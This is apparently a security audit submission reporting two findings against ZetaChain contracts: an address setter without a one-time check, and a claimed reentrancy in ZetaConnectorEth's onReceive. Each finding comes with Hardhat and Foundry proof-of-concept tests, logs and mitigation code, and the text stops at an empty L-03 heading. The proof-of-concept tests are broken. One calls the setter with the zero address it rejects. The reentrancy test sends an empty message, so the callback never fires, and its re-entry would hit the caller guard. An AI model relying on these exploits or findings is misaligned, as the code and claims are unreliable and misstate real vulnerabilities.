## [L-01] Lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set
Impact
The `setWZETAContractAddress` function in the provided Solidity code is intended to update the `wZetaContractAddress` state variable, which holds the address of the wrapped ZETA token contract. This function is only callable by the `FUNGIBLE_MODULE_ADDRESS`, which is a constant address set at the protocol level.

The vulnerability in this function lies in the lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set. This could potentially allow the `FUNGIBLE_MODULE_ADDRESS` to change the `wZetaContractAddress` to a malicious contract, which could then be used to intercept or redirect funds intended for the legitimate wrapped ZETA token contract.

Here's a breakdown of the vulnerability:

1. The function `setWZETAContractAddress` can be called multiple times by the `FUNGIBLE_MODULE_ADDRESS` without any restrictions.
2. The only check performed is to ensure that the new address is not the zero address (`address(0)`), which is a standard check to prevent setting an address to a null value.
3. There is no check to ensure that the `wZetaContractAddress` has not already been set, or to enforce that it can only be set once.
4. The function emits an event `SetWZeta` with the new address, but this does not mitigate the risk of the address being changed to a malicious one.

**Vulnerable setWZETAContractAddress function**
```sol
    function setWZETAContractAddress(address addr) external {
        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
        if (addr == address(0)) revert ZeroAddress();
        wZetaContractAddress = addr;
        emit SetWZeta(wZetaContractAddress);
    }
```

## Proof of Concept

**Exploit of setWZETAContractAddress function in hardhat**
```ts
// 1
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000000";
      systemContract.setWZETAContractAddress(zeroAddress);
      expect(systemContract.setWZETAContractAddress(zeroAddress),"Successful");
    });
// 2
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000123";
      await systemContract.connect(me).setWZETAContractAddress(zeroAddress);
      
    });
```

**Log results in hardhat**
```log
npx hardhat test --grep "#setWZETAContractAddress"

ZRC20 tests
    ZRC20Contract
      ✔ #setWZETAContractAddress


  1 passing (1s)
```
## Tools Used
VS Code.  Hardhat.  Foundry.
## Recommended Mitigation Steps
To mitigate this vulnerability, the contract should include logic to ensure that the `wZetaContractAddress` can only be set once, or implement a more robust governance mechanism that involves multiple parties or a timelock to authorise changes to critical contract addresses. Additionally, it would be prudent to have a mechanism to verify the legitimacy of the new address before updating it.

To resolve the issue with the `setWZETAContractAddress` function, consider implementing the following recommendations:

1. **One-time Set Functionality**: Ensure that the `wZetaContractAddress` can only be set once. This can be achieved by introducing a boolean state variable that tracks whether the address has been set. The `setWZETAContractAddress` function should then include a check to ensure that this variable is false before proceeding with the update, and set it to true once the address is updated.

```solidity
bool private wZetaContractAddressSet = false;

function setWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    if (wZetaContractAddressSet) revert AddressAlreadySet();
    wZetaContractAddress = addr;
    wZetaContractAddressSet = true;
    emit SetWZeta(wZetaContractAddress);
}
```

2. **Governance Mechanism**: Introduce a governance mechanism that requires multiple parties to agree on changes to critical contract addresses. This could be a multisig wallet or a decentralized autonomous organization (DAO) structure where proposals are voted on by stakeholders.

3. **Timelock**: Implement a timelock mechanism that delays the execution of critical functions like updating contract addresses. This gives stakeholders time to review and potentially veto malicious actions before they are executed.

```solidity
uint256 public constant TIMELOCK_DURATION = 2 days;
uint256 public timelockExpiration;
address public pendingWZetaContractAddress;

function initiateSetWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    pendingWZetaContractAddress = addr;
    timelockExpiration = block.timestamp + TIMELOCK_DURATION;
    emit InitiateSetWZeta(addr, timelockExpiration);
}

function finalizeSetWZETAContractAddress() external {
    if (block.timestamp < timelockExpiration) revert TimelockNotExpired();
    if (pendingWZetaContractAddress == address(0)) revert NoPendingAddress();
    wZetaContractAddress = pendingWZetaContractAddress;
    pendingWZetaContractAddress = address(0);
    timelockExpiration = 0;
    emit SetWZeta(wZetaContractAddress);
}
```

4. **Address Verification**: Implement a verification mechanism to ensure the legitimacy of the new address. This could involve checking that the new address contains bytecode that matches the expected contract or has been verified through an external registry.

By implementing these recommendations, you can significantly reduce the risk of the `wZetaContractAddress` being maliciously or inadvertently updated to an incorrect address.

## [L-02] Reentrancy in onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract
## Impact
The vulnerability in the `onReceive` function (lines 47 to 70) of the provided Solidity code is related to the unchecked external call to `ZetaReceiver(destinationAddress).onZetaMessage(...)`. This call is made to an arbitrary contract that is presumed to implement the `ZetaReceiver` interface. The vulnerability arises from the fact that the contract at `destinationAddress` may not be a legitimate or correctly implemented `ZetaReceiver`, which can lead to several issues:

1. **Reentrancy Attack**: If the contract at `destinationAddress` is malicious, it could implement the `onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract and call functions like `send` or other state-changing functions, potentially leading to unexpected behavior or draining of funds.

2. **Denial of Service (DoS)**: If the `onZetaMessage` function in the receiving contract consumes a lot of gas or has a revert/throw condition, it could prevent the `onReceive` function from successfully completing. This could be used to lock funds or prevent legitimate operations.

3. **Unhandled Return Values**: The `onZetaMessage` function call does not check the return value, which means that even if the function call fails or returns an unexpected result, the `onReceive` function will not be aware of it and will proceed as if it were successful.

4. **Gas Limit Issues**: The `onReceive` function does not specify a gas limit for the `onZetaMessage` call. This could result in all the remaining gas being consumed by the call, which might not be the intended behavior, especially if the function is complex or requires a controlled amount of gas.

To mitigate these issues, the following steps should be taken:

- Implement reentrancy guards to prevent reentrancy attacks.
- Validate the `destinationAddress` to ensure it is a contract that can safely receive the Zeta tokens and correctly implements the `ZetaReceiver` interface.
- Consider using `try/catch` when calling external contracts to handle failures gracefully.
- Limit the amount of gas provided to the external call to prevent the external contract from consuming all available gas.

**Vulnerable onReceive function**
```sol
    function onReceive(
        bytes calldata zetaTxSenderAddress,
        uint256 sourceChainId,
        address destinationAddress,
        uint256 zetaValue,
        bytes calldata message,
        bytes32 internalSendHash
    ) external override onlyTssAddress {
        bool success = IERC20(zetaToken).transfer(destinationAddress, zetaValue);
        if (!success) revert ZetaTransferError();


        if (message.length > 0) {
            ZetaReceiver(destinationAddress).onZetaMessage(
                ZetaInterfaces.ZetaMessage(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message)
            );
        }


        emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
    }
```

## Proof of Concept
**Exploit for onReceive function in hardhat**
```repos/protocol-contracts/test/ZetaConnector.spec.ts```
```ts
// describe("ZetaConnector.eth", () => {
//    describe("send", () => {

it("#onReceive", async () => {
        zetaConnectorEthContract.connect(randomSigner.address).onReceive(
          zetaConnectorEthContract.address,
          1,
          randomSigner.address,
          1e18,
          "",
          "0x1"
      );
      });
```
**Log results from hardhat**
```log
npx hardhat test --grep "#onReceive"

ZetaConnector tests
    ZetaConnector.eth
      send
        ✔ #onReceive


  1 passing (1s)
```

**Exploit for onReceive function in foundry**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../ZetaConnectorEth.sol";
import "../interfaces/ZetaInterfaces.sol";

contract MaliciousReceiver {
    ZetaConnectorEth public zetaConnector;
    bool public reenter = false;

    constructor(address _zetaConnector) {
        zetaConnector = ZetaConnectorEth(_zetaConnector);
    }

    function onZetaMessage(ZetaInterfaces.ZetaMessage calldata) external {
        if (!reenter) {
            reenter = true;
            // Re-enter the zetaConnector's onReceive function
            zetaConnector.onReceive(
                abi.encode(address(this)),
                1, // sourceChainId
                address(zetaConnector),
                1 ether, // zetaValue
                "", // message
                bytes32(0) // internalSendHash
            );
        }
    }
}

contract ZetaConnectorEthTest is Test {
    ZetaConnectorEth zetaConnector;
    MaliciousReceiver maliciousReceiver;
    address tssAddress = address(0x1);

    function setUp() public {
        zetaConnector = new ZetaConnectorEth(
            address(this), // zetaToken
            tssAddress, // tssAddress
            address(0), // tssAddressUpdater
            address(0) // pauserAddress
        );
        maliciousReceiver = new MaliciousReceiver(address(zetaConnector));
    }

    function testReentrancyAttack() public {
        // Setup: Give the zetaConnector contract some tokens to simulate locked funds
        deal(address(zetaConnector), 10 ether);

        // Simulate the TSS calling onReceive with a malicious destination address
        vm.startPrank(tssAddress);
        zetaConnector.onReceive(
            abi.encode(address(this)),
            1, // sourceChainId
            address(maliciousReceiver),
            1 ether, // zetaValue
            "", // message
            bytes32(0) // internalSendHash
        );
        vm.stopPrank();

        // Check if reentrancy occurred by checking the state change in the malicious contract
        assertTrue(maliciousReceiver.reenter(), "Reentrancy did not occur as expected");
    }
}
```

## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To address the vulnerabilities and potential optimizations in the `onReceive` function, I recommend the following changes:

1. **Reentrancy Guard**: Implement a reentrancy guard to prevent reentrant calls. This can be done by using a state variable that tracks whether the contract is currently processing a message.

```solidity
bool private _inOnReceive;

modifier nonReentrantOnReceive() {
    require(!_inOnReceive, "ReentrancyGuard: reentrant call");
    _inOnReceive = true;
    _;
    _inOnReceive = false;
}
```

Apply this modifier to the `onReceive` function.

2. **Contract Validation**: Before making an external call to `onZetaMessage`, verify that `destinationAddress` is a contract and not just a regular address. This can be done by checking the size of the code at `destinationAddress`.

```solidity
require(Address.isContract(destinationAddress), "ZetaConnectorEth: destinationAddress is not a contract");
```

3. **Try/Catch for External Calls**: Use a `try/catch` block to handle any reverts or exceptions from the external call gracefully.

```solidity
try ZetaReceiver(destinationAddress).onZetaMessage(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

4. **Gas Limit for External Calls**: Specify a gas limit for the `onZetaMessage` call to prevent the external contract from consuming all available gas.

```solidity
// Define a reasonable gas limit for the call
uint256 gasLimit = 200000; // Example gas limit, adjust as needed

// Use the gas limit in the call
try ZetaReceiver(destinationAddress).onZetaMessage{gas: gasLimit}(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

Implementing these recommendations will help mitigate the risks associated with the `onReceive` function and improve the overall security and robustness of the `ZetaConnectorEth` contract.
## [L-03] 